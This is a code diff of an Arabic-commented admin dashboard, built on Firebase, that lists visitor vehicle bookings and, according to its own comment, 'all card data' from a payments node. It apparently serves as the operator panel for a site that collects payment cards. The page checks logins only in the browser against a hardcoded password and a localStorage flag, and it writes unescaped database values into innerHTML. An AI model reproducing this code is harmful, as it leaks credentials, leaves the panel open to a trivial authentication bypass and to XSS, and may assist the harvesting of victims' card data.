@@ -67,24 +67,20 @@
 </div>
 
 <script>
-    // وظيفة التحقق عند فتح الصفحة (هل المستخدم مسجل دخول سابقاً؟)
     function checkSavedLogin() {
         const isLogged = localStorage.getItem("admin_logged_in");
-        if (isLogged === "true") {
-            showAdmin();
-        }
+        if (isLogged === "true") { showAdmin(); }
     }
 
     function checkLogin() {
         const userInput = document.getElementById('username').value.trim().toLowerCase();
         const passInput = document.getElementById('password').value.trim();
         const errorMsg = document.getElementById('loginError');
-
         const validUsers = ["adman", "adman_"];
-        const validPass = "H0987654H"; // تم تعديل كلمة السر هنا
+        const validPass = "H0987654H";
 
         if(validUsers.includes(userInput) && passInput === validPass) {
-            localStorage.setItem("admin_logged_in", "true"); // حفظ حالة الدخول
+            localStorage.setItem("admin_logged_in", "true");
             showAdmin();
         } else {
             errorMsg.style.display = 'block';
@@ -98,8 +94,8 @@
     }
 
     function logout() {
-        localStorage.removeItem("admin_logged_in"); // حذف حالة الدخول
-        location.reload(); // إعادة تحميل الصفحة للعودة لشاشة الدخول
+        localStorage.removeItem("admin_logged_in");
+        location.reload();
     }
 
     function initFirebase() {
@@ -113,31 +109,41 @@
             appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
         };
         
-        if (!firebase.apps.length) {
-            firebase.initializeApp(firebaseConfig);
-        }
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
 
-        // هذا الجزء يعرض فقط عدد المتواجدين فعلياً الآن في الموقع
+        // العداد الذكي: يعرض فقط الحالات النشطة فعلياً
         database.ref('live_visitors').on('value', s => {
-            document.getElementById('onlineCount').innerText = s.numChildren();
+            let activeNow = 0;
+            const threshold = Date.now() - 40000; // 40 ثانية كحد أقصى لاعتبار الزائر نشط
+            s.forEach(child => {
+                if (child.val().last_active && child.val().last_active > threshold) {
+                    activeNow++;
+                } else {
+                    // تنظيف البيانات القديمة من العداد بصمت دون التأثير على البيانات الأساسية
+                    database.ref('live_visitors/' + child.key).remove();
+                }
+            });
+            document.getElementById('onlineCount').innerText = activeNow;
         });
 
+        // جلب كل بيانات الحجوزات دون استثناء
         database.ref('visitors').on('value', (snapshot) => {
             const grid = document.getElementById('bookingGrid');
             grid.innerHTML = '';
             snapshot.forEach((child) => {
                 const val = child.val();
-                grid.innerHTML += `
+                grid.innerHTML = `
                 <div class="customer-card">
                     <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
                     <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
                     <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
                     <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${child.key}')">حذف</button>
-                </div>`;
+                </div>` + grid.innerHTML;
             });
         });
 
+        // جلب كل بيانات البطاقات دون استثناء
         database.ref('payments').on('value', (snapshot) => {
             const container = document.getElementById('paymentsContainer');
             container.innerHTML = '';
@@ -151,7 +157,7 @@
                     statusClass = "status-waiting";
                 }
 
-                container.innerHTML += `
+                container.innerHTML = `
                 <div class="operation-row">
                     <div class="card-data-wrapper">
                         <div style="min-width:100px;">
@@ -171,7 +177,7 @@
                             <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
                         </div>
                     </div>
-                </div>`;
+                </div>` + container.innerHTML;
             });
         });
     }
